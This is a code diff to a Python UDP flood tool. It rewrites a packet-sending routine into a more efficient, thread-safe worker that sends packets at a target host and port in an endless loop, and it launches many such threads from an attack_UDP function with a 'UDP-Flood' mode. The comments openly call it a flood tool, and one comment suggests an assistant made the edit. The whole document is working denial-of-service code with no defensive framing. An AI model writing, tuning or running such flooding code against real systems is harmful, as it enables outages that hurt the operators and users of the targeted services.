@@ -54,28 +54,42 @@ def resolve_to_ipv4(target: str) -> list[str]:
         return []
 
 
-def send_packet(amplifier, host, port):
-    global s
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        s.connect((str(host), int(port)))
-        while True: s.send(b"\x99" * amplifier)
-    except:
-        return s.close()
-
-
-# This is the new worker function that each thread will run.
-# It continuously calls send_packet until the 'stop_event' is set.
 def udp_worker(stop_event, packet_size, host, port):
     """
-    A worker function that sends packets in a loop until signalled to stop.
+    A worker function that sends UDP packets in a loop until signalled to stop.
+    This function is self-contained and thread-safe.
     """
+    # 1. Prepare the data payload ONCE before the loop for efficiency.
+    data = b"\x99" * packet_size
+
+    # 2. Create and connect the socket ONCE per thread.
+    #    Using a try/except block handles initial connection errors.
+    try:
+        # Create a new socket for this specific thread. This is crucial.
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+        # For UDP, connect() sets the default destination. This is more efficient
+        # than specifying the address with sendto() in every loop iteration.
+        sock.connect((host, port))
+
+    except socket.error as e:
+        # If the socket can't be created or connected, this thread can't work.
+        print(f"[Thread Error] Could not connect to {host}:{port}. Reason: {e}")
+        return  # Exit the thread.
+
+    # 3. The main sending loop.
+    #    This loop is now controllable by the stop_event.
     while not stop_event.is_set():
-        send_packet(packet_size, host, port)
-        # You might want a tiny sleep to prevent 100% CPU usage on one core
-        # just from this loop, depending on how fast send_packet is.
-        # time.sleep(0.001)
+        try:
+            # Send the pre-compiled data.
+            sock.send(data)
+        except socket.error:
+            # This might happen if the network connection is interrupted.
+            # For a flood tool, we can often just ignore it and keep trying.
+            pass
+
+    # 4. Clean up the socket when the loop is broken (stop_event is set).
+    sock.close()
 
 
 # --- Your Corrected Test Function ---
@@ -102,10 +116,10 @@ def attack_UDP(method, host_url, port, duration, threads_per_method=100):
         # A helper function to create and start a thread
         def launch_thread(size):
             # Note: we use `args` to pass arguments to the target function
-            thread = threading.Thread(target=udp_worker, args=(stop_event, size, host, port))
-            thread.daemon = True  # Daemon threads will exit when the main program exits
-            thread.start()
-            threads.append(thread)
+            thread1 = threading.Thread(target=udp_worker, args=(stop_event, size, host, port))
+            thread1.daemon = True  # Daemon threads will exit when the main program exits
+            thread1.start()
+            threads.append(thread1)
 
         if method == "UDP-Flood":
             for _ in range(threads_per_method):
